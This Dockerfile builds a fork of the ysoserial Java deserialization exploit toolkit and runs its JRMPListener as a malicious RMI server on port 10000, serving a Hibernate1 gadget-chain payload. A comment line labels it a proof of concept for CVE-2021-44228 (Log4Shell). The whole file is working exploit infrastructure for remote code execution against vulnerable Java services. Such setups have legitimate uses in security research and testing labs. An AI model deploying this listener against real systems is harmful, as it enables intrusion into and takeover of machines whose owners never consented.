FROM maven:3-jdk-11

RUN git clone https://github.com/uint0/ysoserial.git

WORKDIR /ysoserial
RUN mvn -Dhibernate5 clean package -DskipTests

ENTRYPOINT ["java", "-Dhibernate5", "-cp", "target/ysoserial-0.0.6-SNAPSHOT-all.jar", "ysoserial.exploit.JRMPListener", "10000", "Hibernate1"]

CMD ["echo 'CVE-2021-44228 POC'"]
